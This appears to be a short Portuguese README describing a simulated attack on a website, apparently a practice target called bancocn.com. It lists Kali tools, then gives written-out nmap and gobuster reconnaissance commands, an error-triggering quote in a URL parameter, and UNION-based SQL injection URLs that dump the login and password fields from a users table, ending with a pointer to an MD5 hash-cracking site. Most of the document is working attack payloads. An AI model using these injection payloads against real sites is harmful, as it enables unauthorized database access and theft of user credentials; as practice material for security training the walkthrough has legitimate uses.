# Simulação de ataque a um site
## Ferramentas utilizadas no ataque :
## 1) Kali Linux -> Sistema Operacional  
## 2) whois
## 3) nmap
## 4) gobuster
## 5) sqlmap
# Site alvo do ataque : [LINK](http://www.bancocn.com)

# Passos para invasão

## Explorando vulnerabilidades
### 1) Network Mapper(NMAP) descobre quais portas estão abertas e quais serviços estão sendo executados nessas portas.
```json
sudo nmap bancocn.com
```
### 2) Gobuster descoberta e enumeração de diretórios em servidores web.
```json
sudo gobuster dir -u http://www.bancocn.com/ -w /usr/share/wordlists/dirb/common.txt -x php,xml,html,sql,txt -t 50
```
### 3) Vamos adicionar parametros a url para tentar quebrar a requisição adicionando um ' ao lado do parametro que é o id
```json
http://www.bancocn.com/cat.php?id=1'
```
### Assim vemos uma mensagem que indica que o site usa MariaDB como banco de dados com essa infomação iremos preparar um ataque de injeção sql
No final da url vamo adiconar alguns parametros 

### Cole a url no navegador para pegar fazer uma consulta pelo campo login
```
http://www.bancocn.com/cat.php?id=-1 union select 1,2,group_concat(login) from users
```
### Cole a url no navegador para pegar fazer uma consulta pelo campo password
```
http://www.bancocn.com/cat.php?id=-1 union select 1,2,group_concat(password) from users
```
### 
# Decode de hash
https://md5.gromweb.com 
